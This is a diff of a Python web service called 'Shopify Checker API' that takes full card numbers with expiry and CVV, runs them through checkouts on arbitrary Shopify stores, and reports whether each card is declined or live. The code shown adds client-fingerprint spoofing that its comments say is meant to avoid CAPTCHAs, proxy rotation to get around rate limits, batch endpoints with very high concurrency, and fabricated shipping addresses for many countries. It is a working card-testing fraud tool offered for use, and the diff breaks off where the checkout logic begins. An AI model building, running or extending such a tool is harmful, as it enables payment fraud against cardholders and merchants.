@@ -1,60 +1,25 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 # ==============================================================================
-#  SHOPIFY CHECKER API  —  MERGED + FIXED EDITION  v5
-# ==============================================================================
+#  SHOPIFY CHECKER API  —  SINGLE-PROCESS UNLIMITED EDITION  v6
+# ------------------------------------------------------------------------------
+#  PORT 5000 | aiohttp.web | NO proxies.txt | auto proxy rotation | no limits
+#
 #  ENDPOINTS
 #    GET  /shopify?site=DOMAIN&card=CARD|MM|YYYY|CVV&proxy=host:port
-#    GET  /shopify?site=DOMAIN&cc=CARD|MM|YYYY|CVV&proxy=...        (cc alias)
-#    POST /batch   { "site": "...", "cards": [...], "proxies": [...] }
-#    GET  /status
-#    GET  /stats
-#    GET  /
+#    GET  /shopify?site=DOMAIN&cc=CARD|MM|YYYY|CVV&proxy=...      (cc alias)
+#    POST /batch   {"site":"...","cards":[...],"proxies":[...]}
+#    GET  /status | /stats | /
 #
-#  OPTIONAL QUERY / BODY PARAMS
-#    variant=<id>          force a product variant
-#    key=<name>            per-user concurrency lane
-#    retries=<n>           override MAX_RETRIES for this call
-#    first,last,email,phone,address1,city,state,zip,country   address override
+#  OPTIONAL PARAMS
+#    variant=<id>   key=<user>   retries=<n>   rotate=0
+#    first,last,email,phone,address1,city,state,zip,country
 #
-#  FIXES vs old v4  (why CAPTCHA_REQUIRED was coming)
-#  -----------------------------------------------------------------------------
-#   [FIX-1] COHERENT FINGERPRINT.
-#           Old code: random UA from a pool of Chrome100-131/Edge/Firefox/Safari
-#           but ALWAYS sent Chrome-131 `sec-ch-ua` + platform "Windows".
-#           Firefox UA + Chromium hints  ->  Shopify risk score  ->  hCaptcha.
-#           Now UA and client-hints are generated as ONE PAIR.
-#
-#   [FIX-2] ONE FINGERPRINT PER SESSION.
-#           Old code generated a new random UA for the products call and again
-#           for the checkout call inside the same aiohttp session.
-#           Now the same fp object is threaded through every hop.
-#
-#   [FIX-3] force_close=True connector (matches the build that works).
-#           keepalive_timeout=25 was reusing proxy tunnels across the checkout
-#           handshake; some residential gateways rotate the exit IP on reconnect.
-#
-#   [FIX-4] CAPTCHA RETRY = fresh fingerprint + fresh session.
-#           Old code retried captcha with yet another random UA on the same
-#           connection. Now it is deliberate: new fp, small backoff.
-#
-#   [FIX-5] MULTI-PORT in one process (PORT + EXTRA_PORTS).
-#           nginx  ->  127.0.0.1:8083   (keeps /api1/shopify working)
-#           direct ->  0.0.0.0:9092     (IP:9092/shopify)
-#
-#   [FIX-6] Full working flow merged in: term-accept loop, delivery
-#           re-negotiate, progressive-rate poll, digital / no-ship branch,
-#           typed SubmitRejected code handling, robust poll.
-#
-#  RUN
-#    pip install flask aiohttp aiohttp-socks waitress
-#    python app.py                      # 8083 + 9092 both
-#    python app.py --port 9092          # single port
-#    python app.py --port 9092 --extra-ports ""     # only 9092
-#
-#  ENV
-#    PORT, EXTRA_PORTS, THREADS, GLOBAL_MAX_CONCUR, PER_USER_CONCUR,
-#    MAX_RETRIES, CAPTCHA_RETRY, REQ_TOTAL_TIMEOUT, START_STAGGER,
-#    FORCE_CLOSE, SITE_CACHE_TTL, FINGERPRINT_MODE (fixed|random)
+#  WHY THIS BUILD
+#    - aiohttp.web => koi thread-per-request cap nahi (Flask+waitress hata diya)
+#    - proxy registry => proxies.txt ki zarurat nahi, bot ke bheje proxy learn karta hai
+#    - har net/429/PCI error pe proxy rotate + cooldown
+#    - global 429 brake + per-host pacer => rate limit storm khatam
 # ==============================================================================
 
 import os
@@ -66,13 +31,12 @@ import uuid
 import random
 import string
 import asyncio
-import threading
 import logging
 import argparse
 from urllib.parse import urlparse, quote
 
 import aiohttp
-from flask import Flask, request, jsonify
+from aiohttp import web
 
 
 # ==============================================================================
@@ -100,32 +64,41 @@ def _env_bool(name, default):
     return str(v).strip().lower() in ("1", "true", "yes", "on")
 
 
-PORT               = _env_int("PORT", 8083)
-_EXTRA_PORTS_RAW   = os.environ.get("EXTRA_PORTS", "9092")
-THREADS            = _env_int("THREADS", 200)
-GLOBAL_MAX_CONCUR  = _env_int("GLOBAL_MAX_CONCUR", 3000)
-PER_USER_CONCUR    = _env_int("PER_USER_CONCUR", 1200)
-MAX_RETRIES        = _env_int("MAX_RETRIES", 1)
-CAPTCHA_RETRY      = _env_int("CAPTCHA_RETRY", 1)
-REQ_TOTAL_TIMEOUT  = _env_float("REQ_TOTAL_TIMEOUT", 40)
-START_STAGGER      = _env_float("START_STAGGER", 0.05)
-FORCE_CLOSE        = _env_bool("FORCE_CLOSE", True)
-SITE_CACHE_TTL     = _env_float("SITE_CACHE_TTL", 900)
-FINGERPRINT_MODE   = os.environ.get("FINGERPRINT_MODE", "fixed").strip().lower()
+PORT              = _env_int("PORT", 5000)
+HOST              = os.environ.get("HOST", "0.0.0.0")
+GLOBAL_MAX_CONCUR = _env_int("GLOBAL_MAX_CONCUR", 100000)
+PER_USER_CONCUR   = _env_int("PER_USER_CONCUR", 100000)
 
-PROXY_COOLDOWN      = 30
-PROXY_GAP           = 3
-SITE_PROXY_COOLDOWN = 180
+MAX_RETRIES       = _env_int("MAX_RETRIES", 1)
+CAPTCHA_RETRY     = _env_int("CAPTCHA_RETRY", 1)
+NET_RETRIES       = _env_int("NET_RETRIES", 3)
+RL_RETRIES        = _env_int("RL_RETRIES", 3)
+CONNECT_RETRY     = _env_int("CONNECT_RETRY", 3)
+
+REQ_TOTAL_TIMEOUT = _env_float("REQ_TOTAL_TIMEOUT", 30)
+START_STAGGER     = _env_float("START_STAGGER", 0.0)
+FORCE_CLOSE       = _env_bool("FORCE_CLOSE", False)
+SITE_CACHE_TTL    = _env_float("SITE_CACHE_TTL", 1800)
+FINGERPRINT_MODE  = os.environ.get("FINGERPRINT_MODE", "fixed").strip().lower()
+ROTATE            = _env_bool("ROTATE", True)
+
+PROXY_COOLDOWN      = _env_float("PROXY_COOLDOWN", 20)
+PROXY_RL_COOLDOWN   = _env_float("PROXY_RL_COOLDOWN", 45)
+SITE_PROXY_COOLDOWN = _env_float("SITE_PROXY_COOLDOWN", 120)
+HOST_MIN_GAP        = _env_float("HOST_MIN_GAP", 0.005)
+RL_PAUSE            = _env_float("RL_PAUSE", 2.0)
+SEEN_MAX            = _env_int("SEEN_MAX", 60000)
 POLL_MAX_SLEEP      = 0.6
 
 API_VERSIONS = ["2025-01", "2024-10", "2024-07", "2024-01"]
 
+log = logging.getLogger("shopify")
+logging.basicConfig(level=logging.INFO,
+                    format="%(asctime)s %(levelname)s %(message)s")
+
 
 # ==============================================================================
-#  [FIX-1] FINGERPRINT ENGINE
-# ------------------------------------------------------------------------------
-#  A fingerprint is a single dict holding UA + matching sec-ch-ua hints.
-#  They are ALWAYS created together so they can never disagree.
+#  FINGERPRINT ENGINE  (UA + sec-ch-ua ALWAYS ek saath, mismatch = captcha)
 # ==============================================================================
 
 _WIN   = "Windows NT 10.0; Win64; x64"
@@ -156,7 +129,6 @@ def _fp_edge(version, platform_ua, platform_hint):
 
 
 def _build_fp_pool():
-    """Coherent (ua, client-hints) pairs. Nothing can mismatch."""
     pool = []
     for v in range(120, 132):
         pool.append(_fp_chrome(v, _WIN, "Windows"))
@@ -171,7 +143,6 @@ def _build_fp_pool():
 
 _FP_POOL = _build_fp_pool()
 
-# The exact fingerprint that is known to sail through on this store.
 FIXED_FP = {
     "ua": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
@@ -188,78 +159,105 @@ def new_fingerprint():
 
 
 # ==============================================================================
-#  PROXY HANDLING  (url param > proxies.txt pool > direct)
+#  PROXY ENGINE
+# ------------------------------------------------------------------------------
+#  - koi proxies.txt nahi. Pool khaali ho to registry (bot ke bheje proxy) use hota hai
+#  - rotate on every net / 429 / pci / captcha error
+#  - cross-request RL cooldown + per-proxy cooldown + prune
 # ==============================================================================
 
+PROXY_POOL = []                 # optional proxies.txt ho to
+_cooldown_proxies = {}          # proxy -> expire (short)
+_pcool_mem = {}                 # proxy -> expire (rate-limit, long)
+_last_used = {}
+_site_proxy_cool = {}
+_proxy_failures = {}
+
+_SEEN_PROXIES = set()
+_SEEN_LIST = []
+
+_last_prune = 0.0
+
+
 def _load_proxy_pool():
-    pool = []
-    candidates = [
-        "proxies.txt",
-        os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt"),
-    ]
-    for path in candidates:
+    """Optional. File ho to load, na ho to bilkul theek."""
+    out = []
+    for path in ("proxies.txt",
+                 os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")):
         if os.path.isfile(path):
             try:
                 with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                     for line in fh:
                         line = line.strip()
                         if line and not line.startswith("#"):
-                            pool.append(line)
+                            out.append(line)
             except OSError:
                 pass
             break
-    return pool
+    return out
 
 
 PROXY_POOL = _load_proxy_pool()
-_cooldown_proxies = {}
-_last_used = {}
-_site_proxy_cool = {}
-_proxy_failures = {}
-_pool_lock = threading.Lock()
 
 
-def _auto_proxy(explicit=None, exclude_site=None):
-    if explicit:
-        return explicit
-    if not PROXY_POOL:
-        return None
-    now = time.time()
-    site_bad = set()
-    if exclude_site:
-        site_bad = {p for p, exp in _site_proxy_cool.get(exclude_site, {}).items() if exp > now}
-    good = [p for p in PROXY_POOL
-            if p not in site_bad
-            and _cooldown_proxies.get(p, 0) <= now
-            and (_last_used.get(p, 0) + PROXY_GAP <= now)]
-    if good:
-        chosen = random.choice(good)
-        _last_used[chosen] = now
-        return chosen
-    with _pool_lock:
-        _cooldown_proxies.clear()
-        _last_used.clear()
-    chosen = random.choice(PROXY_POOL)
-    _last_used[chosen] = now
-    return chosen
-
-
-def _cooldown_proxy(p):
-    if p:
-        _cooldown_proxies[p] = time.time() + PROXY_COOLDOWN
-
-
-def _mark_proxy_fail(p):
-    if not p or p not in PROXY_POOL:
+def _seen_proxy(p):
+    """Har incoming request ka proxy yaad rakho -> rotation ka source."""
+    if not p:
         return
-    _proxy_failures[p] = _proxy_failures.get(p, 0) + 1
-    if _proxy_failures[p] >= 3:
-        with _pool_lock:
-            if p in PROXY_POOL:
-                PROXY_POOL.remove(p)
-        _cooldown_proxies.pop(p, None)
-        _last_used.pop(p, None)
-        _proxy_failures.pop(p, None)
+    if p in _SEEN_PROXIES:
+        return
+    _SEEN_PROXIES.add(p)
+    _SEEN_LIST.append(p)
+    if len(_SEEN_LIST) > SEEN_MAX:
+        cut = len(_SEEN_LIST) // 5
+        drop = _SEEN_LIST[:cut]
+        del _SEEN_LIST[:cut]
+        for d in drop:
+            _SEEN_PROXIES.discard(d)
+        _prune_cooldowns()
+
+
+def _prune_cooldowns():
+    global _last_prune
+    now = time.time()
+    if now - _last_prune < 60:
+        return
+    _last_prune = now
+    for d in (_cooldown_proxies, _pcool_mem, _last_used):
+        for k in [k for k, v in d.items() if v <= now]:
+            d.pop(k, None)
+    for site in list(_site_proxy_cool.keys()):
+        live = {p: e for p, e in _site_proxy_cool[site].items() if e > now}
+        if live:
+            _site_proxy_cool[site] = live
+        else:
+            _site_proxy_cool.pop(site, None)
+
+
+def _pool():
+    return PROXY_POOL if PROXY_POOL else _SEEN_LIST
+
+
+def _pcool_is_bad(p, now=None):
+    if not p:
+        return False
+    now = now or time.time()
+    exp = _pcool_mem.get(p, 0)
+    if exp <= now:
+        if exp:
+            _pcool_mem.pop(p, None)
+        return False
+    return True
+
+
+def _pcool_mark(p, secs=None):
+    if p:
+        _pcool_mem[p] = time.time() + (PROXY_RL_COOLDOWN if secs is None else secs)
+
+
+def _cooldown_proxy(p, secs=None):
+    if p:
+        _cooldown_proxies[p] = time.time() + (PROXY_COOLDOWN if secs is None else secs)
 
 
 def _cooldown_site_proxy(site, p):
@@ -269,8 +267,53 @@ def _cooldown_site_proxy(site, p):
     _site_proxy_cool.setdefault(key, {})[p] = time.time() + SITE_PROXY_COOLDOWN
 
 
+def _mark_proxy_fail(p):
+    if not p:
+        return
+    _proxy_failures[p] = _proxy_failures.get(p, 0) + 1
+
+
+def _rotate_proxy(cur):
+    """Different proxy do. Pool khaali ho to None (direct lane)."""
+    if not ROTATE:
+        return None
+    pool = _pool()
+    if not pool:
+        return None
+    now = time.time()
+    for _ in range(14):
+        p = random.choice(pool)
+        if p == cur:
+            continue
+        if _pcool_is_bad(p, now):
+            continue
+        if _cooldown_proxies.get(p, 0) > now:
+            continue
+        return p
+    for _ in range(10):
+        p = random.choice(pool)
+        if p != cur:
+            return p
+    if len(pool) == 1 and pool[0] == cur:
+        return None
+    return None
+
+
+def _auto_proxy():
+    pool = _pool()
+    if not pool:
+        return None
+    now = time.time()
+    for _ in range(14):
+        p = random.choice(pool)
+        if _pcool_is_bad(p, now) or _cooldown_proxies.get(p, 0) > now:
+            continue
+        return p
+    return random.choice(pool)
+
+
 def parse_proxy(proxy_str):
-    """Normalize any proxy format into something aiohttp/aiohttp-socks accepts."""
+    """Koi bhi format -> aiohttp/aiohttp-socks friendly URL."""
     if proxy_str is None:
         return None
     raw = str(proxy_str).strip().strip("'\"")
@@ -323,7 +366,6 @@ def is_socks(p):
 
 
 def build_connector(proxy_url=None):
-    """[FIX-3] force_close connector by default."""
     if proxy_url and is_socks(proxy_url):
         try:
             from aiohttp_socks import ProxyConnector
@@ -336,7 +378,7 @@ def build_connector(proxy_url=None):
     else:
         conn = aiohttp.TCPConnector(
             ssl=False, limit=0, limit_per_host=0,
-            ttl_dns_cache=300, keepalive_timeout=25, enable_cleanup_closed=True,
+            ttl_dns_cache=300, keepalive_timeout=30, enable_cleanup_closed=True,
         )
     return conn, proxy_url
 
@@ -359,6 +401,100 @@ def is_proxy_err(exc):
 
 
 # ==============================================================================
+#  ERROR CLASSIFIERS
+# ==============================================================================
+
+_NET_MARKS = (
+    "connection_error", "server disconnected", "connection reset", "reset by peer",
+    "timeout", "timed out", "eof", "broken pipe", "cannot connect", "clientconnect",
+    "proxy", "unreachable", "network", "remotedisconnected", "pci_token",
+    "api http error 502", "api http error 503", "api http error 504",
+    "cart failed", "checkout_session_failed",
+)
+
+_RL_MARKS = (
+    "rate_limited", "rate limit", "throttl", "too many", "429", "queue token",
+)
+
+
+def _is_net_err(msg):
+    m = str(msg).lower()
+    return any(k in m for k in _NET_MARKS)
+
+
+def _is_rate_limited_msg(msg):
+    m = str(msg).lower()
+    return any(k in m for k in _RL_MARKS)
+
+
+def _is_captcha_msg(msg):
+    return "CAPTCHA_REQUIRED" in str(msg).upper()
+
+
+_RETRYABLE = ("required_artifacts", "artifacts_unavailable", "stale_artifact",
+              "signature_mismatch", "checkpoint_data_invalid",
+              "unparseable", "generic_error", "negotiation failed")
+
+
+def _is_retryable(msg):
+    m = str(msg).lower()
+    return any(k in m for k in _RETRYABLE)
+
+
+# ==============================================================================
+#  GLOBAL 429 BRAKE  +  PER-HOST PACER
+# ==============================================================================
+
+_RL_PAUSE_UNTIL = 0.0
+_RL_LOCK = None
+
+
+def _rl_lock():
+    global _RL_LOCK
+    if _RL_LOCK is None:
+        _RL_LOCK = asyncio.Lock()
+    return _RL_LOCK
+
+
+def _rl_pause(secs=None):
+    global _RL_PAUSE_UNTIL
+    t = time.time() + (RL_PAUSE if secs is None else secs)
+    if t > _RL_PAUSE_UNTIL:
+        _RL_PAUSE_UNTIL = t
+
+
+async def _rl_wait():
+    if _RL_PAUSE_UNTIL <= time.time():
+        return
+    async with _rl_lock():
+        now = time.time()
+        if _RL_PAUSE_UNTIL > now:
+            await asyncio.sleep(_RL_PAUSE_UNTIL - now)
+
+
+_host_last = {}
+_host_locks = {}
+
+
+async def _host_pace(host, gap=None):
+    if not host:
+        return
+    gap = HOST_MIN_GAP if gap is None else gap
+    if gap <= 0:
+        return
+    lock = _host_locks.get(host)
+    if lock is None:
+        lock = _host_locks[host] = asyncio.Lock()
+    async with lock:
+        now = time.time()
+        wait = gap - (now - _host_last.get(host, 0.0))
+        if wait > 0:
+            await asyncio.sleep(wait)
+            now = time.time()
+        _host_last[host] = now
+
+
+# ==============================================================================
 #  ADDRESS BOOK
 # ==============================================================================
 
@@ -369,7 +505,7 @@ C2C = {
     "BRL": "BR", "KRW": "KR", "THB": "TH", "MYR": "MY", "PHP": "PH", "IDR": "ID",
     "TWD": "TW", "ZAR": "ZA", "ILS": "IL", "TRY": "TR", "SAR": "SA", "QAR": "QA",
     "KWD": "KW", "CNY": "CN", "HUF": "HU", "RON": "RO", "BGN": "BG", "CLP": "CL",
-    "COP": "CO", "PEN": "PE", "ARS": "AR", "FR": "FR",
+    "COP": "CO", "PEN": "PE", "ARS": "AR",
 }
 
 book = {
@@ -415,6 +551,30 @@ book = {
                 "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
 }
 
+_EXTRA_BOOK = {
+    "IE": {"address1": "1 Grafton Street", "city": "Dublin", "postalCode": "D02 XY45", "zoneCode": "D", "countryCode": "IE", "phone": "16123456"},
+    "IT": {"address1": "Via Roma 1", "city": "Milano", "postalCode": "20121", "zoneCode": "MI", "countryCode": "IT", "phone": "0212345678"},
+    "ES": {"address1": "Calle Mayor 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "MD", "countryCode": "ES", "phone": "911234567"},
+    "NL": {"address1": "Damrak 1", "city": "Amsterdam", "postalCode": "1012", "zoneCode": "NH", "countryCode": "NL", "phone": "201234567"},
+    "PT": {"address1": "Rua Augusta 1", "city": "Lisboa", "postalCode": "1100-053", "zoneCode": "LI", "countryCode": "PT", "phone": "211234567"},
+    "PL": {"address1": "Marszalkowska 1", "city": "Warszawa", "postalCode": "00-001", "zoneCode": "MZ", "countryCode": "PL", "phone": "221234567"},
+    "CZ": {"address1": "Vaclavske namesti 1", "city": "Praha", "postalCode": "11000", "zoneCode": "PR", "countryCode": "CZ", "phone": "221234567"},
+    "TH": {"address1": "Sukhumvit 1", "city": "Bangkok", "postalCode": "10110", "zoneCode": "BKK", "countryCode": "TH", "phone": "21234567"},
+    "MY": {"address1": "Jalan Bukit Bintang 1", "city": "Kuala Lumpur", "postalCode": "55100", "zoneCode": "KUL", "countryCode": "MY", "phone": "312345678"},
+    "ID": {"address1": "Jalan Sudirman 1", "city": "Jakarta", "postalCode": "10220", "zoneCode": "JK", "countryCode": "ID", "phone": "2112345678"},
+    "PH": {"address1": "Ayala Avenue 1", "city": "Makati", "postalCode": "1226", "zoneCode": "NCR", "countryCode": "PH", "phone": "212345678"},
+    "KR": {"address1": "Gangnam-daero 1", "city": "Seoul", "postalCode": "06236", "zoneCode": "KR-11", "countryCode": "KR", "phone": "212345678"},
+    "TW": {"address1": "Xinyi Road 1", "city": "Taipei", "postalCode": "110", "zoneCode": "TPE", "countryCode": "TW", "phone": "212345678"},
+    "ZA": {"address1": "Long Street 1", "city": "Cape Town", "postalCode": "8001", "zoneCode": "WC", "countryCode": "ZA", "phone": "211234567"},
+    "IL": {"address1": "Rothschild 1", "city": "Tel Aviv", "postalCode": "6688101", "zoneCode": "TA", "countryCode": "IL", "phone": "312345678"},
+    "TR": {"address1": "Istiklal 1", "city": "Istanbul", "postalCode": "34430", "zoneCode": "IST", "countryCode": "TR", "phone": "2121234567"},
+    "SA": {"address1": "King Fahd Road 1", "city": "Riyadh", "postalCode": "12271", "zoneCode": "RD", "countryCode": "SA", "phone": "112345678"},
+}
+book.update(_EXTRA_BOOK)
+
+FALLBACK_COUNTRIES = ["US", "GB", "CA", "AU", "SG", "DE", "FR", "IE", "IT", "ES",
+                      "NL", "NZ", "IN", "AE", "HK", "JP", "SE", "DK", "NO", "PL"]
+
 
 def pick_addr(url, cc=None, rc=None, overrides=None):
     cc = (cc or "").upper()
@@ -437,6 +597,46 @@ def pick_addr(url, cc=None, rc=None, overrides=None):
             if val not in (None, ""):
                 base[key] = val
     return base
+
+
+def _country_candidates(ourl, currency, overrides, cap=6):
+    if overrides and overrides.get("countryCode"):
+        return [str(overrides["countryCode"]).upper()]
+    order = []
+    ccn = C2C.get((currency or "").upper())
+    if ccn and ccn in book and ccn not in order:
+        order.append(ccn)
+    tcn = urlparse(ourl).netloc.split(".")[-1].upper()
+    if tcn in book and tcn not in order:
+        order.append(tcn)
+    for c in FALLBACK_COUNTRIES:
+        if c in book and c not in order:
+            order.append(c)
+    if not order:
+        order = ["US"]
+    return order[:cap]
+
+
+def _apply_addr_to_vars(variables, addr, fn, ln):
+    sa = {
+        "address1": addr["address1"], "address2": "", "city": addr["city"],
+        "countryCode": addr["countryCode"], "postalCode": addr["postalCode"],
+        "firstName": fn, "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"],
+    }
+    try:
+        variables["delivery"]["deliveryLines"][0]["destination"]["partialStreetAddress"] = dict(sa)
+    except (KeyError, IndexError, TypeError):
+        pass
+    try:
+        variables["payment"]["billingAddress"]["streetAddress"] = dict(sa)
+    except (KeyError, TypeError):
+        pass
+    try:
+        variables["buyerIdentity"]["customer"]["countryCode"] = addr["countryCode"]
+        variables["buyerIdentity"]["phoneCountryCode"] = addr["countryCode"]
+        variables["buyerIdentity"]["shopPayOptInPhone"]["countryCode"] = addr["countryCode"]
+    except (KeyError, TypeError):
+        pass
 
 
 # ==============================================================================
@@ -532,20 +732,21 @@ class Utils:
 # ==============================================================================
 
 _SITE_CACHE = {}
-_site_cache_lock = threading.Lock()
 
 
 def _cache_get(site):
-    with _site_cache_lock:
-        entry = _SITE_CACHE.get(site)
-        if entry and (time.time() - entry[1]) < SITE_CACHE_TTL:
-            return entry[0]
+    entry = _SITE_CACHE.get(site)
+    if entry and (time.time() - entry[1]) < SITE_CACHE_TTL:
+        return entry[0]
     return None
 
 
 def _cache_set(site, variant):
-    with _site_cache_lock:
-        _SITE_CACHE[site] = (variant, time.time())
+    _SITE_CACHE[site] = (variant, time.time())
+    if len(_SITE_CACHE) > 50000:
+        now = time.time()
+        for k in [k for k, v in _SITE_CACHE.items() if now - v[1] > SITE_CACHE_TTL]:
+            _SITE_CACHE.pop(k, None)
 
 
 def _norm(domain):
@@ -554,7 +755,7 @@ def _norm(domain):
 
 
 # ==============================================================================
-#  [FIX-1][FIX-2] HEADERS — fingerprint is threaded through, never regenerated
+#  HEADERS  (fingerprint threaded through, kabhi regenerate nahi)
 # ==============================================================================
 
 def _product_headers(domain, fp):
@@ -602,7 +803,7 @@ def _checkout_headers(domain, fp):
 
 
 # ==============================================================================
-#  CAPTCHA / RESPONSE CLASSIFIERS
+#  RESPONSE CLASSIFIERS
 # ==============================================================================
 
 def is_captcha(text):
@@ -635,11 +836,15 @@ def clean_resp(message):
     if not message:
         return "UNKNOWN_ERROR"
     m = str(message)
-    if "3DS_REQUIRED" in m.upper():
+    if "3DS_REQUIRED" in m.upper() or "3D_SECURE" in m.upper():
         return "3DS_REQUIRED"
-    cm = re.search(r'"code"\s*:\s*"([^"]+)"', m)
-    if cm:
-        return cm.group(1)
+    for pat in (r'"code"\s*:\s*"([^"]+)"', r"'code'\s*:\s*'([^']+)'",
+                r"(PAYMENTS_[A-Z0-9_]+)", r"(CARD_[A-Z0-9_]+)"):
+        cm = re.search(pat, m, re.IGNORECASE)
+        if cm:
+            val = cm.group(1).strip("{}:'\" ")
+            if val:
+                return val
     s = m.strip()
     if re.match(r"^[A-Z][A-Z0-9_]+$", s):
         return s
@@ -647,10 +852,12 @@ def clean_resp(message):
 
 
 # ==============================================================================
-#  STOREFRONT PRODUCTS
+#  STOREFRONT PRODUCTS  (GraphQL -> products.json fallback, with connect retry)
 # ==============================================================================
 
-PRODUCTS_Q = """query FetchProducts($first:Int!){products(first:$first){edges{node{handle variants(first:50){edges{node{id availableForSale requiresShipping price{amount}}}}}}}}"""
+PRODUCTS_Q = ("query FetchProducts($first:Int!){products(first:$first){edges{node{handle "
+              "variants(first:50){edges{node{id availableForSale requiresShipping "
+              "price{amount}}}}}}}}")
 
 
 def _vid_from_gid(gid):
@@ -735,7 +942,8 @@ async def _gql_products(session, domain, ver, proxy, headers):
 async def _json_products(session, domain, proxy, headers):
     try:
         async with session.get(f"{domain}/products.json", proxy=proxy, timeout=12,
-                               headers={"User-Agent": headers["User-Agent"], "Accept": "*/*"}) as r:
+                               headers={"User-Agent": headers["User-Agent"],
+                                        "Accept": "*/*"}) as r:
             if r.status != 200:
                 return None
             txt = await r.text()
@@ -761,26 +969,34 @@ async def fetch_products(domain, proxy_str=None, session=None, request_proxy=Non
             purl = parse_proxy(proxy_str) if proxy_str else None
             conn, request_proxy = build_connector(purl)
             session = aiohttp.ClientSession(connector=conn,
-                                            timeout=aiohttp.ClientTimeout(total=12),
+                                            timeout=aiohttp.ClientTimeout(total=15),
                                             headers=headers)
         try:
-            data = None
-            last = None
-            for ver in API_VERSIONS:
-                data, err = await _gql_products(session, domain, ver, request_proxy, headers)
-                if data and data.get("products"):
-                    break
-                last = err
-                if err and "404" not in str(err):
-                    break
-            if data and data.get("products"):
-                picked = _pick_cheapest(data, domain)
-                if picked:
-                    return picked
-            picked = await _json_products(session, domain, request_proxy, headers)
-            if picked:
-                return picked
-            return False, ("Storefront GraphQL failed" if last else "No Valid Products")
+            last_err = None
+            for attempt in range(CONNECT_RETRY):
+                try:
+                    await _host_pace(urlparse(domain).netloc)
+                    data = None
+                    for ver in API_VERSIONS:
+                        data, err = await _gql_products(session, domain, ver, request_proxy, headers)
+                        if data and data.get("products"):
+                            break
+                        last_err = err
+                        if err and "404" not in str(err):
+                            break
+                    if data and data.get("products"):
+                        picked = _pick_cheapest(data, domain)
+                        if picked:
+                            return picked
+                    picked = await _json_products(session, domain, request_proxy, headers)
+                    if picked:
+                        return picked
+                    return False, ("Storefront GraphQL failed" if last_err else "No Valid Products")
+                except (aiohttp.ClientError, OSError) as e:
+                    last_err = e
+                    await asyncio.sleep(0.15 * (attempt + 1))
+                    continue
+            return False, f"Proxy Error: {last_err}"
         finally:
             if own:
                 await session.close()
@@ -926,6 +1142,7 @@ def _reject_needs_accept(codes):
             return True
     return False
 
+
 _ARTIFACT_CODES = (
     "REQUIRED_ARTIFACTS_UNAVAILABLE", "ARTIFACTS_UNAVAILABLE", "STALE_ARTIFACT",
     "SCRIPT_FINGERPRINT", "SIGNATURE_MISMATCH", "NON_NEGOTIABLE_TERMS",
@@ -942,8 +1159,6 @@ def _needs_renagotiate(codes):
 
 
 def _capture_artifacts(seller, variables):
-    """sellerProposal ke saare ARTIFACTS variables me daalo.
-    Submit me inko echo karna zaroori hai, warna REQUIRED_ARTIFACTS_UNAVAILABLE."""
     if not isinstance(seller, dict):
         return
 
@@ -977,6 +1192,7 @@ def _capture_artifacts(seller, variables):
     if tf:
         variables["transformerFingerprintV2"] = tf
 
+
 def _pending_ms(seller):
     if not isinstance(seller, dict):
         return 1000
@@ -990,80 +1206,57 @@ def _pending_ms(seller):
     return 1000
 
 
-# ==============================================================================
-#  CORE CHECKOUT
-# ==============================================================================
+async def _open_checkout(session, url, variant_id, proxy, doc_headers):
+    """cart permalink GET -> fallback cart/add.js + POST /checkout/ (2nd API se)."""
+    last = (None, "", None, 0)
+    for attempt in range(CONNECT_RETRY):
+        try:
+            await _host_pace(urlparse(url).netloc)
+            resp = await session.get(f"{url}/cart/{variant_id}:1", allow_redirects=True,
+                                     headers=doc_headers, proxy=proxy)
+            text = await resp.text()
+            cu = str(resp.url)
+            sst = (resp.headers.get("X-Checkout-One-Session-Token")
+                   or resp.headers.get("x-checkout-one-session-token"))
+            if not sst:
+                sst = (extract_between(text, 'name="serialized-sessionToken" content="&quot;', "&quot;")
+                       or extract_between(text, 'name="serialized-sessionToken" content="', '"')
+                       or extract_between(text, '"serializedSessionToken":"', '"')
+                       or extract_between(text, 'data-session-token="', '"'))
+            if sst or resp.status < 400:
+                return cu, text, sst, resp.status
+            last = (cu, text, sst, resp.status)
+        except (aiohttp.ClientError, OSError) as e:
+            last = (None, f"cart error: {e}", None, 0)
+        await asyncio.sleep(0.15 * (attempt + 1))
 
-
-# ==============================================================================
-#  COUNTRY FALLBACK  —  delivery UnavailableTerms aaye to next country try karo
-# ==============================================================================
-
-FALLBACK_COUNTRIES = ["US", "GB", "CA", "AU", "SG", "DE", "FR", "IE", "IT", "ES",
-                      "NL", "NZ", "IN", "AE", "HK", "JP", "SE", "DK", "NO", "PL"]
-
-_EXTRA_BOOK = {
-    "IE": {"address1": "1 Grafton Street", "city": "Dublin", "postalCode": "D02 XY45", "zoneCode": "D", "countryCode": "IE", "phone": "16123456"},
-    "IT": {"address1": "Via Roma 1", "city": "Milano", "postalCode": "20121", "zoneCode": "MI", "countryCode": "IT", "phone": "0212345678"},
-    "ES": {"address1": "Calle Mayor 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "MD", "countryCode": "ES", "phone": "911234567"},
-    "NL": {"address1": "Damrak 1", "city": "Amsterdam", "postalCode": "1012", "zoneCode": "NH", "countryCode": "NL", "phone": "201234567"},
-    "PT": {"address1": "Rua Augusta 1", "city": "Lisboa", "postalCode": "1100-053", "zoneCode": "LI", "countryCode": "PT", "phone": "211234567"},
-    "PL": {"address1": "Marszalkowska 1", "city": "Warszawa", "postalCode": "00-001", "zoneCode": "MZ", "countryCode": "PL", "phone": "221234567"},
-    "CZ": {"address1": "Vaclavske namesti 1", "city": "Praha", "postalCode": "11000", "zoneCode": "PR", "countryCode": "CZ", "phone": "221234567"},
-    "TH": {"address1": "Sukhumvit 1", "city": "Bangkok", "postalCode": "10110", "zoneCode": "BKK", "countryCode": "TH", "phone": "21234567"},
-    "MY": {"address1": "Jalan Bukit Bintang 1", "city": "Kuala Lumpur", "postalCode": "55100", "zoneCode": "KUL", "countryCode": "MY", "phone": "312345678"},
-    "ID": {"address1": "Jalan Sudirman 1", "city": "Jakarta", "postalCode": "10220", "zoneCode": "JK", "countryCode": "ID", "phone": "2112345678"},
